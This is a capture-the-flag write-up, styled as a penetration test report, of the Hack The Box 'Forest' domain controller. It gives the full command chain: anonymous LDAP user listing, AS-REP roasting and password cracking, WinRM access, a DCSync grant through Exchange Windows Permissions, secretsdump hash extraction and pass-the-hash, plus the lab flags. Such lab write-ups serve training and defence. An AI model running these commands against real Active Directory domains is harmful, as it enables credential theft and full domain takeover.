
**Executive Summary**  
A penetration test was conducted against the Forest machine to identify security vulnerabilities and assess the overall security posture. The assessment successfully demonstrated a complete chain of exploitation, beginning with service enumeration that revealed an Active Directory Domain Controller, leading to privilege escalation and full domain compromise

**Methodology & Detailed Findings**  
The engagement commenced with a comprehensive port scan of the target using the command `sudo nmap -sC -sV -Pn -O -p 1-65535 10.129.33.34 --open`. This scan revealed a significant number of open ports, including key services such as Kerberos on port 88, LDAP on ports 389 and 3268, and SMB on port 445. The service versions and banners identified the system as a Microsoft Windows Server 2016 Standard host, and the LDAP service confirmed the domain name as `htb.local`. The presence of WinRM on port 5985 indicated a potential remote management endpoint.

```bash
sudo nmap -sC -sV -Pn -O -p 1-65535 10.129.33.34 --open   
```

```output
3/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-10-20 20:23:55Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
```

The initial attack vector was a time synchronization query using `sudo ntpdate 10.129.33.34`. This command returned the system time and confirmed the host's responsiveness, revealing a significant time step adjustment of approximately 413 seconds. This initial interaction with the NTP service provided a low-level confirmation of the host's availability and set the stage for further enumeration.

```bash
sudo ntpdate  10.129.33.34                              
2025-10-20 16:26:21.402615 (-0400) +413.150290 +/- 0.008549 10.129.33.34 s1 no-leap
CLOCK: time stepped by 413.150290
```

Network-level enumeration was conducted using the `nxc smb 10.129.33.34` command. This confirmed the target's hostname as FOREST, its role as a Windows Server 2016 Build 14393 Domain Controller for the `htb.local` domain, and that SMB signing was required but SMBv1 was enabled.

```bash
nxc smb 10.129.33.34  
SMB         10.129.33.34    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) 
```

Hostname resolution was configured by adding the entry `10.129.33.34 forest.htb.local htb.local` to the local `/etc/hosts` file. This ensured proper DNS resolution for the target domain during the assessment.

```bash
 cat  /etc/hosts 
 10.129.33.34  FOREST  forest.htb.local htb.local
```

A critical finding was made using the command `nxc ldap 10.129.33.34 -u '' -p '' --users --kdc forest.htb.local`. This successfully performed anonymous LDAP binding and enumerated all domain users, including the service account `svc-alfresco`, without requiring authentication.
```bash
nxc ldap 10.129.33.34  -u '' -p ''  --users --kdc forest.htb.local
```


```output
LDAP        10.129.33.34    389    FOREST           Administrator                 2021-08-30 20:51:58 0        Built-in account for administering the computer/domain      
LDAP        10.129.33.34    389    FOREST           Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.33.34    389    FOREST           DefaultAccount                <never>             0        A user account managed by the system.                       
LDAP        10.129.33.34    389    FOREST           krbtgt                        2019-09-18 06:53:23 0        Key Distribution Center Service Account                     
LDAP        10.129.33.34    389    FOREST           $331000-VK4ADACQNUCA          <never>             0                                                                    
LDAP        10.129.33.34    389    FOREST           SM_2c8eef0a09b545acb          <never>             0                                                                    
LDAP        10.129.33.34    389    FOREST           SM_ca8c2ed5bdab4dc9b          <never>             0                                                                    
LDAP        10.129.33.34    389    FOREST           SM_75a538d3025e4db9a          <never>             0                                                                    
LDAP        10.129.33.34    389    FOREST           SM_681f53d4942840e18          <never>             0                                                                    
LDAP        10.129.33.34    389    FOREST           SM_1b41c9286325456bb          <never>             0                                                                    
LDAP        10.129.33.34    389    FOREST           SM_9b69f1b9d2cc45549          <never>             0                                                                    
LDAP        10.129.33.34    389    FOREST           SM_7c96b981967141ebb          <never>             0                                                                    
LDAP        10.129.33.34    389    FOREST           SM_c75ee099d0a64c91b          <never>             0                                                                    
LDAP        10.129.33.34    389    FOREST           SM_1ffab36a2f5f479cb          <never>             0                                                                    
LDAP        10.129.33.34    389    FOREST           HealthMailboxc3d7722          2019-09-23 18:51:31 0                                                                    
LDAP        10.129.33.34    389    FOREST           HealthMailboxfc9daad          2019-09-23 18:51:35 0                                                                    
LDAP        10.129.33.34    389    FOREST           HealthMailboxc0a90c9          2019-09-19 07:56:35 0                                                                    
LDAP        10.129.33.34    389    FOREST           HealthMailbox670628e          2019-09-19 07:56:45 0                                                                    
LDAP        10.129.33.34    389    FOREST           HealthMailbox968e74d          2019-09-19 07:56:56 0                                                                    
LDAP        10.129.33.34    389    FOREST           HealthMailbox6ded678          2019-09-19 07:57:06 0                                                                    
LDAP        10.129.33.34    389    FOREST           HealthMailbox83d6781          2019-09-19 07:57:17 0                                                                    
LDAP        10.129.33.34    389    FOREST           HealthMailboxfd87238          2019-09-19 07:57:27 0                                                                    
LDAP        10.129.33.34    389    FOREST           HealthMailboxb01ac64          2019-09-19 07:57:37 0                                                                    
LDAP        10.129.33.34    389    FOREST           HealthMailbox7108a4e          2019-09-19 07:57:48 0                                                                    
LDAP        10.129.33.34    389    FOREST           HealthMailbox0659cc1          2019-09-19 07:57:58 0                                                                    
LDAP        10.129.33.34    389    FOREST           sebastien                     2019-09-19 20:29:59 0                                                                    
LDAP        10.129.33.34    389    FOREST           lucinda                       2019-09-19 20:44:13 0                                                                    
LDAP        10.129.33.34    389    FOREST           svc-alfresco                  2025-10-20 16:35:30 0                                                                    
LDAP        10.129.33.34    389    FOREST           andy                          2019-09-22 18:44:16 0                                                                    
LDAP        10.129.33.34    389    FOREST           mark                          2019-09-20 18:57:30 0                                                                    
LDAP        10.129.33.34    389    FOREST           santi                         2019-09-20 19:02:55 0                                                              
```

The user list from the anonymous LDAP enumeration was parsed using `awk` to extract usernames. This clean list, including `svc-alfresco`, was prepared for a password attack.
```bash
nxc ldap 10.129.33.34 -u '' -p '' --users --kdc  forest.htb.local | awk '{print $5}'
```

```output
Administrator
Guest
DefaultAccount
krbtgt
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

The enumerated usernames were saved to a file named `users.txt` using output redirection for use in subsequent attacks
```bash
nxc ldap 10.129.33.34 -u '' -p '' --users --kdc  forest.htb.local | awk '{print $5}'>users.txt

```
Kerberoasting was attempted using `GetNPUsers.py` to request Kerberos TGTs for users in `users.txt`. The command targeted the domain `htb.local` and output any recovered hashes to `userhash.txt`.
```bash
GetNPUsers.py htb.local/ -usersfile users.txt -dc-ip 10.129.33.34 -outputfile userhash.txt
```

The Kerberoasting attack was successful. The command `GetNPUsers.py` retrieved a Kerberos pre-authentication hash for the user `svc-alfresco`, which was saved to `userhash.txt`. This hash is crackable offline to recover the account's plaintext password.

```output
$krb5asrep$23$svc-alfresco@HTB.LOCAL:caf51edcfb98342fc880e1af854bdf17$3616afc2edfdef30aec88203370174d4694c9314e8584746520071a0ab9757467719127d93e98c4cbee38df2fb900563cde465689834d8265abb84b0c272679c85530c8b2ec1d7e366a14d9e19700c131f158c38c17613b6ee3eed72e8ab0c57260dec42a1dc52d8960a8a6ede265903c61d5ac158560682efe57132e51116e5b54cf116aa650af1f7d20b6de19b4201da52ac8bbea328ff1da731bc97484c2520a7864cf21a69b4fc6db32a0a6847c0dd51fde1dfdce3a73da545128ccef1473f1fcc8d0303c9786b92840e3240328fd778ac646c7d064022f39150350b74777ac6fecd755e
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
                            
```

```bash
echo '$krb5asrep$23$svc-alfresco@HTB.LOCAL:caf51edcfb98342fc880e1af854bdf17$3616afc2edfdef30aec88203370174d4694c9314e8584746520071a0ab9757467719127d93e98c4cbee38df2fb900563cde465689834d8265abb84b0c272679c85530c8b2ec1d7e366a14d9e19700c131f158c38c17613b6ee3eed72e8ab0c57260dec42a1dc52d8960a8a6ede265903c61d5ac158560682efe57132e51116e5b54cf116aa650af1f7d20b6de19b4201da52ac8bbea328ff1da731bc97484c2520a7864cf21a69b4fc6db32a0a6847c0dd51fde1dfdce3a73da545128ccef1473f1fcc8d0303c9786b92840e3240328fd778ac646c7d064022f39150350b74777ac6fecd755e'>hash.txt
```

The hash for `svc-alfresco` was successfully cracked using John the Ripper with the rockyou wordlist. The plaintext password was recovered as `s3rvice`.
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:30 DONE (2025-10-20 18:35) 0.03261g/s 133260p/s 133260c/s 133260C/s s401447401447401447..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
The credentials `svc-alfresco:s3rvice` were validated successfully via SMB, confirming initial access to the domain.
```bash
nxc smb 10.129.33.34  -u 'svc-alfresco' -p 's3rvice'  
SMB         10.129.33.34    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) 
SMB         10.129.33.34    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
                                                            
```

A shell was obtained via WinRM using the credentials `svc-alfresco:s3rvice`. The `(Pwn3d!)` status confirms successful code execution and initial foothold on the host.
```bash
nxc winrm 10.129.33.34  -u 'svc-alfresco' -p 's3rvice' 
WINRM       10.129.33.34    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
WINRM       10.129.33.34    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
                                       
```
An attempt to perform Kerberoasting with `impacket-GetUserSPNs` using the `svc-alfresco` credentials was made, but no Service Principal Names were found for delegation.

```bash
impacket-GetUserSPNs -request htb.local/svc-alfresco:s3rvice  -dc-ip 10.129.33.34
Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

The initial foothold was established using an interactive Evil-WinRM shell as the user `svc-alfresco`. This provided command execution on the Domain Controller.

```bash
 evil-winrm -i 10.129.33.34 -u svc-alfresco -p s3rvice  
```

The user flag `f255db6bd55478854cb2e96d9dc3b36e` was successfully captured from the `svc-alfresco` user's desktop.

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> cat user.txt
f255db6bd55478854cb2e96d9dc3b36e
```
Domain enumeration was performed using BloodHound-python with the `svc-alfresco` credentials. The `-c All` flag collected all available data for later analysis to identify privilege escalation paths.

```bash
bloodhound-python -u svc-alfresco -p 's3rvice' -d htb.local -v --zip -c All -dc forest.htb.local -ns 10.129.33.34
```


BloodHound analysis revealed a critical attack path. The group `Exchange Windows Permissions@htb.local` has `WriteDacl` privileges on the domain object, which can be leveraged to grant the `svc-alfresco` user the `DCSync` privilege, enabling full domain compromise.
![[Pasted image 20251021010704.png]]

### **ACL-based Privilege Escalation to DCSync Attack**.

A new user `i0n1c` with password `HackedForest1` was created and added to the `Exchange Windows Permissions` group to exploit its `WriteDacl` privilege on the domain object

```bash
*Evil-WinRM* PS C:\temp> upload PowerView-Dev.ps1
Evil-WinRM* PS C:\temp> Import-Module .\PowerView-Dev.ps1
*Evil-WinRM* PS C:\temp> net user i0n1c HackedForest1 /add /domain
*Evil-WinRM* PS C:\temp> net group "Exchange Windows Permissions"
net group "Exchange Windows Permissions" /add i0n1c
```

The user `i0n1c` was successfully confirmed as a member of the `Exchange Windows Permissions` group, granting the necessary permissions to modify the domain's ACL.
```bash
*Evil-WinRM* PS C:\temp> net group "Exchange Windows Permissions"
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
i0n1c
The command completed successfully

```

Using PowerView and the credentials for `i0n1c`, the `DCSync` right was successfully granted to the user `i0n1c` on the domain root, enabling the replication of all domain password data.
```bash
*Evil-WinRM* PS C:\temp> $SecPassword = ConvertTo-SecureString 'HackedForest1' -AsPlainText -Force
*Evil-WinRM* PS C:\temp> $Cred = New-Object System.Management.Automation.PSCredential('htb\i0n1c', $SecPassword)
*Evil-WinRM* PS C:\temp> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity i0n1c -Rights DCSync
```
The `DCSync` attack was executed using `secretsdump.py` with the `i0n1c` credentials. All domain hashes, including the Administrator's NTLM hash, were successfully dumped to `secretsdumphash.txt`.

```bash
secretsdump.py htb.local/i0n1c:HackedForest1@10.129.33.34 > secretsdumphash.txt
```

The `secretsdump.py` output confirmed a full domain compromise. The NTLM hash for the `Administrator` account (`32693b11e6aa90eb43d32c72a07ceea6`) was successfully extracted.

```output
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::

```

A pass-the-hash attack was performed using the Administrator's NTLM hash to gain a privileged shell on the Domain Controller via Evil-WinRM.

```bash
evil-winrm -i 10.129.33.34 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

The root flag `844dcccd69076217093e7487555e0de8` was successfully captured. The assessment concluded with full domain administrator compromise, demonstrating a complete attack chain from anonymous enumeration to complete domain control.

```bash
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
844dcccd69076217093e7487555e0de8

```
